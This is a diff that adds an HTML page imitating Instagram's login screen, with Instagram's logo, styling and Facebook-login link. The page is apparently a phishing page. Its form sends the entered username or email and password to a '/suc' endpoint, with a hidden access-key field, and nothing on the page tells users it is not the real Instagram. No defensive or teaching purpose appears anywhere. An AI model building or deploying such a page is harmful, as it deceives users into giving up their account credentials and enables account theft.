@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            border-radius: 1px;
+            text-align: center;
+            width: 300px;
+        }
+
+        .logo {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            background-color: #fafafa;
+        }
+
+        .login-container input[type="submit"] {
+            width: 100%;
+            padding: 8px;
+            margin: 10px 0;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: #0077c2;
+        }
+
+        .divider {
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            position: relative;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: auto;
+        }
+
+        .divider::before {
+            margin-right: 10px;
+        }
+
+        .divider::after {
+            margin-left: 10px;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+            display: block;
+            margin: 10px 0;
+        }
+
+        .facebook-login:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .signup {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .signup a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+        <form action="/suc" method="post">
+            <input type="hidden" name="access_key" value="596e3a19-0354-4c99-ab40-bded453e4218">
+            <input type="text" name="userId" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password"  placeholder="Password" required>
+            <input type="submit" value="Log In">
+        </form>
+        <div class="divider">OR</div>
+        <a href="#" class="facebook-login">Log in with Facebook</a>
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+</body>
+</html>
